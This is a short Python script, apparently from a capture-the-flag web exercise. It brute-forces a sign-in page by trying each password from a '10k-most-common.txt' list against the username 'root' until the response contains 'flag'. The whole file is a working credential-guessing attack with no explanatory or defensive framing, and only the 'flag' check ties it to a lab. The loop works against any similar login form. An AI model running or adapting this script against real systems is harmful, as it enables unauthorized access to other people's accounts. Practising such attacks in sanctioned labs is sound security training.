#!/usr/bin/env python3

import os
import glob
import argparse
import requests

URL = os.environ.get('URL')
PASSWORDS = glob.glob("./**/" + "10k-most-common.txt", recursive=True)[0]
PARAMS = {"page": "signin", "Login": "Login", "username": "root"}


def check(password):
    PARAMS["password"] = password
    r = requests.get(URL, PARAMS)
    if "flag" in r.text:
        return True
    return False


def main():
    with open(PASSWORDS, "r") as file:
        while True:
            password = file.readline()
            if password:
                if check(password.strip("\n")):
                    print(f"Found it => {password}")
                    break
                else:
                    print(f"Nope for => {password}")
            else:
                break


if __name__ == "__main__":
    if not URL:
        parser = argparse.ArgumentParser(description="Find the right password")
        parser.add_argument("URL", help="URL address of the server")
        args = parser.parse_args()
        URL = args.URL
    main()
